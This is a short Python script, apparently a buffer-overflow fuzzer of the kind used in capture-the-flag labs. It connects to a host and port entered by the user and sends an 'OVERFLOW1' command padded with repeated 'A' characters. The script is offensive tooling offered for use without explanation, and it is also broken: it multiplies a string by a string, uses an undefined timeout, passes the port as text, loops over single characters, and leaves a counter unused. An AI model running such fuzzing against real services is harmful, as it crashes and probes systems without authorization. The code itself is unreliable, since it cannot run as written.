import socket
import sys

counter = 100

#ip=sys.argv[1]
#port=sys.argv[2]
#vuln_param=sys.argv[3]
ip = input('Please Enter the Host IP : ')
port = input('Please Enter The Port Number : ')
starting_input = input("Startig Input : ")

#vuln_param = input('Enter Vuln_Param : ')
buffer='A'*starting_input

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + buffer + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)